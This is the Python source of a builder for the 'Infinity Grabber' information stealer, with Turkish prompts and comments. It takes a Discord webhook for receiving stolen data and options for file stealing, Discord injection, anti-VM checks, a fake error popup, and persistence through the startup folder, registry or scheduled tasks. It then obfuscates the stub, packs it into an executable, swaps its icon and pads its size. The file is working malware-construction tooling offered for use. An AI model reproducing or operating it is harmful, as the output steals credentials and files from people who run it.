# https://discord.gg/client
# Coded by Kayasin52
# Builder of Infinity Grabber
# Bizi tercih ettiğiniz için teşekkür ederiz, iyi kullanımlar

import os
import ctypes
import shutil
import sys
import re

try:
    # Set's the console title
    ctypes.windll.kernel32.SetConsoleTitleW(f"Infinity Grabber | Builder | {os.getenv('computername')}")
except:
    pass

# Class for building the Infinity
class Build:
    def __init__(self) -> None:
        # Initialize various attributes used in the build process
        self.webhook = None
        self.StealFiles = bool()
        self.Anti_VM = bool()
        self.startup = bool()
        self.StartupMethod = None
        self.injection = bool()
        self.fakeError = bool()
        self.current_path = os.getcwd()
        self.pump = bool()
        self.pumSize = int()  # mb
        self.PyInstallerCommand = "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir UPX --version-file AssemblyFile\\version.txt"

    def CallFuncions(self) -> None:
        try:
            # Call's various functions to gather user input and perform build steps
            self.GetWebhook()
            self.GetAntiVm()
            self.GetDiscordInjection()
            self.GetStealFiles()
            self.GetStartupMethod()
            self.GetFakeError()
            self.GetIcon()
            self.PumpFile()
            self.WriteSettings()
            os.system("cls")
            self.ObfuscateFile("Stub.py")
            self.build_file()
            shutil.copy("dist\\stub.exe", "stub.exe")
            if self.pump == True:
                self.expand_file("stub.exe", self.pumSize)
            try:
                # Delete Junk Files & Directories
                shutil.rmtree("dist")
                shutil.rmtree("build")
                os.remove("stub.py")
                os.remove("stub.spec")
            except:
                pass
            if os.path.exists("stub.exe"):
                os.rename("stub.exe", "Infinity.exe")
            print("\nfile compiled, close the window")
        except Exception as e:
            # Displays an error message if an exception occurs
            ctypes.windll.user32.MessageBoxW(0, f"Dosyanız oluşturulurken bir hata oluştu. hata kodu\n\n{str(e)}", "Error", 0x10)
        else:
            # Displays success message and open the file location
            os.system("start .")
            ctypes.windll.user32.MessageBoxW(0, "Dosyanız başarıyla derlendi, artık pencereyi kapatabilirsiniz.", "Information", 0x40)
            while True:
                continue

    # Function to prompt user for file pumping option
    def PumpFile(self) -> None:
        pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nPump Dosyası İstiyor Musunuz? : "))
        if pump_q.lower() == "y" or pump_q.lower() == "yes":
            pump_size = int(input("Kaç mb boyutunu istiyorsunuz? pump: "))
            self.pump = True
            self.pumSize = pump_size
        else:
            self.pump = False

    # Function to expand the size of a file
    def expand_file(self, file_name, additional_size_mb) -> None:
        if os.path.exists(file_name):
            additional_size_bytes = additional_size_mb * 1024 * 1024

            with open(file_name, "ab") as file:
                empty_bytes = bytearray([0x00] * additional_size_bytes)
                file.write(empty_bytes)

                print(f'{additional_size_mb} MB added to "{os.path.join(self.current_path, file_name)}"')

    # Function to build the file using PyInstaller
    def build_file(self) -> None:
        os.system(self.PyInstallerCommand)

    # Function to write settings to the Stub.py file
    def WriteSettings(self) -> None:
        with open("Infinity.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = (
            data.replace("%WEBHOOK%", str(self.webhook))
            .replace('"%Anti_VM%"', str(self.Anti_VM))
            .replace('"%injection%"', str(self.injection))
            .replace("%startup_method%", str(self.StartupMethod))
            .replace('"%fake_error%"', str(self.fakeError))
            .replace('"%StealCommonFiles%"', str(self.StealFiles))
        )
        with open("Stub.py", "w", encoding="utf-8", errors="ignore") as laquica:
            laquica.write(replaced_data)

    # Function to obfuscate the Stub.py file
    def ObfuscateFile(self, input_file) -> None:
        obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
        os.system(f'python "{obf_file}" "{input_file}" stub.py')

    # Function to prompt user for changing the file icon
    def GetIcon(self) -> None:
        get_icon = str(input("Yes/No\nDosyanın simgesini değiştirmek istiyor musunuz? : "))
        if get_icon.lower() == "yes" or get_icon.lower() == "y":
            get_icon_path = str(input("Simge dosyası .ico olmalıdır, aksi halde simge değişmeyecektir.\nSimge dosyasının yolunu girin : "))
            if not get_icon_path.endswith(".ico"):
                print("Lütfen .ico dosyasını kullanın, artık simge değişikliği devre dışı bırakıldı.")
                self.PyInstallerCommand += " --icon=NONE stub.py"
            else:
                if not os.path.isfile(get_icon_path):
                    print("Dosya mevcut değil, simge değişikliği devre dışı bırakıldı.")
                    self.PyInstallerCommand += " --icon=NONE stub.py"
                else:
                    if self.CheckIcoFile(get_icon_path):
                        self.PyInstallerCommand += f" --icon={get_icon_path} stub.py"
                    else:
                        print("Dosyanız .ico dosyası içermiyor, simge değişikliği devre dışı bırakıldı")
                        self.PyInstallerCommand += " --icon=NONE stub.py"
        else:
            self.PyInstallerCommand += " --icon=NONE stub.py"

    # Function to check if a file is a valid .ico file
    def CheckIcoFile(self, file_path: str) -> bool:
        try:
            ico_header = b"\x00\x00\x01\x00"  # ico header

            with open(file_path, "rb") as file:
                header_data = file.read(4)

            return header_data == ico_header
        except:
            return False

    # Kullanıcıdan sahte hata kullanmasını isteme işlevi
    def GetFakeError(self) -> None:
        try:
            er = str(input("Yes/No\nKullanılsın mı ? Sahte Windows Erroru : "))
            if er.lower() == "yes" or er.lower() == "y":
                self.fakeError = True
            else:
                self.fakeError = False
        except:
            pass

    # Kullanıcıdan webhook URL'sini isteme işlevi
    def GetWebhook(self) -> None:
        user_webhook = str(input("Webhook Urlni Gir : "))
        if user_webhook.startswith("https://") and "discord" in user_webhook:
            self.webhook = user_webhook
        else:
            print("Lütfen Doğru bir webhook URL'si girin, bu pencereyi kapatın ve builderi yeniden başlatın.")
            while True:
                continue
            
    # Kullanıcıdan dosya çalmayı etkinleştirmesini isteme işlevi
    def GetStealFiles(self) -> None:
        getFilesReq = str(input("Yes/No\nEtkinleştirmek İstiyor Musunuz? File Stealer: "))
        if getFilesReq.lower() == "y" or getFilesReq.lower() == "yes":
            self.StealFiles = True
        else:
            self.StealFiles = False

    # Kullanıcıdan Anti-VM'yi etkinleştirmesini isteyen işlev
    def GetAntiVm(self) -> None:
        getAntiVmReq = str(input("Yes/No\nEtkinleştirmek İstiyor Musunuz? Anti-VM : "))
        if getAntiVmReq.lower() == "y" or getAntiVmReq.lower() == "yes":
            self.Anti_VM = True
        else:
            self.Anti_VM = False

    # Kullanıcıdan başlatma yöntemini isteme işlevi
    def GetStartupMethod(self) -> None:
        getStartupReq = str(input("Yes/no\nBaşlangıçta Açılsın Mı ? : "))
        if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
            self.startup = True
            print("--------------------------------------------\n1-)Folder Startup (This method uses Windows startup folder for startup) \n2-)HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n3-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n4-)Disable Startup\n--------------------------------------------\n\n")
            getStartupMethod = input("1/2/3/4\nEnter your selection: ")
            if getStartupMethod == "1":
                self.StartupMethod = "folder"
            elif getStartupMethod == "2":
                self.StartupMethod = "regedit"
            elif getStartupMethod == "3":
                self.StartupMethod = "schtasks"
            elif getStartupMethod == "4":
                self.StartupMethod == "no-startup"
            else:
                print("Unknown Startup method, startup has been disabled.")
                self.startup = False
                self.StartupMethod = "no-startup"
        else:
            self.startup = False
            self.StartupMethod == "no-startup"

    # Kullanıcıdan Discord enjeksiyonunu etkinleştirmesini isteme işlevi
    def GetDiscordInjection(self) -> None:
        inj = str(input("Yes/No\nDiscord enjeksiyonunu etkinleştirmek istiyor musunuz? : "))
        if inj.lower() == "y" or inj.lower() == "yes":
            self.injection == True
        else:
            self.injection = False

# Entryp point of the program
if __name__ == "__main__":
    if os.name == "nt":
        if (sys.version_info.major == 3 and sys.version_info.minor >= 10 and sys.version_info.minor < 12):
            # Create an instance of Build class and call the main building function
            Build().CallFuncions()
        else:
            # Displays an error message if Python version is not supported
            message = "Kullandığınız Python Sürümü Desteklenmiyor Infinity. Lütfen Bunları Kullan Python 3.10.0 or 3.11.0"
            ctypes.windll.user32.MessageBoxW(None, ctypes.c_wchar_p(message), "Error", 0x10)
    else:
        print("Yalnızca Windows işletim sistemleri desteklenir!")
